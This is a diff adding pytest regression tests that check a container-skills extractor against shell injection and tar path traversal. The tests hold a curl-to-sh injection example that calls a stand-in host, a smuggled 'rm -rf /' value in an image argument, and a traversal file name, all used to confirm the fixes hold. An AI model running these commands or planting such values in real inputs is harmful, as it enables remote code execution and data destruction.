@@ -2627,3 +2627,191 @@ class TestEntrypointSpawnerFactory:
         spawner = _create_spawner()
 
         assert spawner._http_endpoint == "https://proxy.example.com"
+
+
+class TestExtractSkillsImageCraneOnly:
+    """Tests for _extract_skills_image() (issue #202).
+
+    The Podman SDK/CLI fallbacks were removed: both built a shell command
+    string via `" && ".join(f"cp -r {p} ..." for p in copy_paths)` run via
+    `sh -c`, with `copy_paths` sourced directly from request-supplied
+    `skills_paths` (no validation) -- a value like
+    `/skills; curl evil.sh | sh` would execute inside the extraction
+    container. crane never invokes a shell (skills_image is passed as a
+    single argv element to `crane export`), so removing the fallback
+    chain closes that surface entirely rather than just patching it.
+    Extraction now either works via crane or raises -- no silent retry
+    with a different, less-safe mechanism.
+    """
+
+    @staticmethod
+    def _make_spawner(mocker: MockerFixture):
+        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
+
+        return OpenShellSpawner(openshell_client=mocker.Mock(), endpoint="gw:8080")
+
+    @pytest.mark.asyncio
+    async def test_raises_when_crane_not_found(self, mocker: MockerFixture, tmp_path) -> None:
+        """No crane binary on PATH -> raises immediately, no fallback attempted.
+
+        Matches specifically on "crane binary not found" (not just "crane"
+        anywhere in the message) because the old fallback chain's final
+        error -- "none of crane, Podman SDK, or podman CLI available" --
+        also contains the word "crane", so a looser match would pass even
+        if a fallback were silently still attempted underneath.
+        """
+        spawner = self._make_spawner(mocker)
+        mocker.patch("shutil.which", return_value=None)
+        mock_run = mocker.patch("subprocess.run")
+
+        with pytest.raises(RuntimeError, match="crane binary not found"):
+            await spawner._extract_skills_image(
+                "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
+            )
+
+        mock_run.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_raises_when_crane_export_fails(self, mocker: MockerFixture, tmp_path) -> None:
+        """crane present but `crane export` exits non-zero -> raises, no fallback."""
+        spawner = self._make_spawner(mocker)
+        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
+        mock_run = mocker.patch(
+            "subprocess.run",
+            return_value=mocker.Mock(returncode=1, stderr=b"manifest unknown"),
+        )
+
+        with pytest.raises(RuntimeError, match="crane export failed"):
+            await spawner._extract_skills_image(
+                "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
+            )
+
+        mock_run.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_crane_export_uses_argv_form_no_shell(
+        self, mocker: MockerFixture, tmp_path
+    ) -> None:
+        """skills_image is passed as a single argv element, not via a shell."""
+        import tarfile
+        from io import BytesIO
+
+        spawner = self._make_spawner(mocker)
+        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
+
+        tar_buf = BytesIO()
+        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
+            info = tarfile.TarInfo(name="skills/hello.txt")
+            data = b"hi"
+            info.size = len(data)
+            tar.addfile(info, BytesIO(data))
+
+        mock_run = mocker.patch(
+            "subprocess.run",
+            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
+        )
+
+        malicious_image = "quay.io/example/skills:latest; rm -rf /"
+        await spawner._extract_skills_image(malicious_image, ["/skills"], str(tmp_path))
+
+        call_args = mock_run.call_args[0][0]
+        assert call_args == ["/usr/local/bin/crane", "export", malicious_image, "-"]
+
+    @pytest.mark.asyncio
+    async def test_extracts_matching_paths_and_strips_prefix(
+        self, mocker: MockerFixture, tmp_path
+    ) -> None:
+        """Files under a matching skill_path are extracted with the prefix stripped."""
+        import tarfile
+        from io import BytesIO
+        from pathlib import Path
+
+        spawner = self._make_spawner(mocker)
+        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
+
+        tar_buf = BytesIO()
+        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
+            data = b"skill content"
+            info = tarfile.TarInfo(name="skills/my-skill/SKILL.md")
+            info.size = len(data)
+            tar.addfile(info, BytesIO(data))
+            other_data = b"unrelated"
+            other_info = tarfile.TarInfo(name="usr/bin/other")
+            other_info.size = len(other_data)
+            tar.addfile(other_info, BytesIO(other_data))
+
+        mocker.patch(
+            "subprocess.run",
+            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
+        )
+
+        await spawner._extract_skills_image(
+            "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
+        )
+
+        extracted = Path(tmp_path) / "my-skill" / "SKILL.md"
+        assert extracted.read_bytes() == b"skill content"
+        assert not (Path(tmp_path) / "usr").exists()
+
+    @pytest.mark.asyncio
+    async def test_traversal_guard_rejects_sibling_dir_sharing_prefix(
+        self, mocker: MockerFixture, tmp_path
+    ) -> None:
+        """A resolved path must be inside tmp_dir, not merely string-prefixed by it.
+
+        Regression test for the missing-separator gap flagged in issue
+        #202: `resolved.startswith(tmp_dir)` (without requiring
+        `tmp_dir + os.sep`) would incorrectly accept a sibling directory
+        whose name happens to share tmp_dir as a string prefix, e.g.
+        tmp_dir="/tmp/skills-x" and resolved="/tmp/skills-xyz/evil" --
+        `"/tmp/skills-xyz".startswith("/tmp/skills-x")` is True even
+        though skills-xyz is not inside skills-x.
+
+        The malicious member must be skipped *before* tar.extract() is
+        ever called for it (Python's own tarfile "data" extraction filter,
+        default since 3.12/PEP 706, would also independently reject an
+        unsafe destination -- but by raising, aborting the whole batch,
+        rather than skipping just the one bad member). The other,
+        legitimate member in the same tar must still extract normally,
+        proving this is a graceful per-member skip, not something that
+        depends on the whole extraction failing.
+        """
+        import tarfile
+        from io import BytesIO
+        from pathlib import Path
+
+        spawner = self._make_spawner(mocker)
+        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
+
+        real_tmp_dir = str(tmp_path / "skills-x")
+        os.makedirs(real_tmp_dir)
+        sibling_dir = str(tmp_path / "skills-xyz")
+        os.makedirs(sibling_dir)
+
+        tar_buf = BytesIO()
+        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
+            # After prefix-stripping "skills/", normpath's to
+            # "../skills-xyz/evil.txt" relative to real_tmp_dir -- landing
+            # in the sibling directory, which merely shares real_tmp_dir
+            # as a string prefix (no os.sep boundary).
+            evil_data = b"escaped"
+            evil_info = tarfile.TarInfo(name="skills/../skills-xyz/evil.txt")
+            evil_info.size = len(evil_data)
+            tar.addfile(evil_info, BytesIO(evil_data))
+
+            good_data = b"legit skill"
+            good_info = tarfile.TarInfo(name="skills/good/SKILL.md")
+            good_info.size = len(good_data)
+            tar.addfile(good_info, BytesIO(good_data))
+
+        mocker.patch(
+            "subprocess.run",
+            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
+        )
+
+        await spawner._extract_skills_image(
+            "quay.io/example/skills:latest", ["/skills"], real_tmp_dir
+        )
+
+        assert not (Path(sibling_dir) / "evil.txt").exists()
+        assert (Path(real_tmp_dir) / "good" / "SKILL.md").read_bytes() == b"legit skill"
